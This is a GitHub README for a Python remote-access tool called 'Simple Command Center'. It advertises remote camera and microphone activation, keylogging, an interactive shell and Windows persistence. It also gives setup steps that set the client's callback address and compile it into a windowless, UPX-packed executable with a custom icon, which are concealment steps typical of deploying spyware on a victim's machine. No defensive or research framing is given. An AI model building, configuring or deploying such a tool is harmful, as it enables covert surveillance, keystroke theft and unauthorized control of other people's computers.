# Simple Command Center
[Version en Español](https://github.com/whoamih4csor/Simple-Command-Center/tree/spanish)
A command center to remotely send commands to clients and receive multiple connections.

### Features
- You can only communicate with one client at a time.
- You can remotely activate the camera and microphone.
- Supports keylogger.
- You can access an interactive console.
- You can have persistence in Windows.
- Supports auto-connections.
- Supports SSL.
- The Client is only supported on windows

## Requirements
- [Python 3.11.1](https://www.python.org/downloads/release/python-3111/): this is the version in which it was tested.
- [OpenSSL](https://www.openssl.org/) to generate certificates.
- In Windows, [Microsoft Visual C++](https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170).

#### Optional:
- [UPX](https://upx.github.io/) (the Ultimate Packer for eXecutables) to reduce the size of the .exe.

## Installation
1. First, download the repository:
    ```
    git clone https://github.com/whoamih4csor/Simple-Command-Center
    ```
2. Second, navigate to the directory:
    ```
    cd Simple-Command-Center
    ```
3. Third, install the dependencies with:
    ```
    pip install -r requirements.txt
    ```
    or
    ```
    python -m pip install -r requirements.txt
    ```
4. Fourth, generate the SSL certificates:
    ```
    openssl req -nodes -x509 -newkey rsa:4096 -keyout server.key -out server.cer -days 356
    ```

## Usage
1. Start the server:
    ```
    python .\Server.py -m terminal -a IP -p PORT
    ```
    or
    ```
    python .\Server.py -m graphic -a IP -p PORT
    ```
2. Enter the command "help" for more information:
    ```
    help
    ```
3. Modify the parameters of the client:
    - Open the file Client-Windows.py.
    - Change the lines:
        ```
        self.IP = '192.168.0.10' # the IP to which the client will connect
        self.PORT = 4747 # the IP port
        ```
4. Compile the client with auto-py-to-exe or with the following command:
    ```
    pyinstaller --noconfirm --onefile --windowed --name "NAME.exe"  ".\Client-Windows.py"
    ```
    If you installed UPX:
    ```
    pyinstaller --noconfirm --onefile --windowed --name "Client" --upx-dir "Path to UPX directory"  ".\Client-Windows.py"
    ```
    If you want to change the icon of the binary, add:
    ```
    --icon "image.icon"
    ```

## Contribution
If you have suggestions or want to report a bug, please report it at https://github.com/whoamih4csor/Simple-Command-Center/issues

## Credits
Thanks to ChatGPT for helping me in some parts of the code.
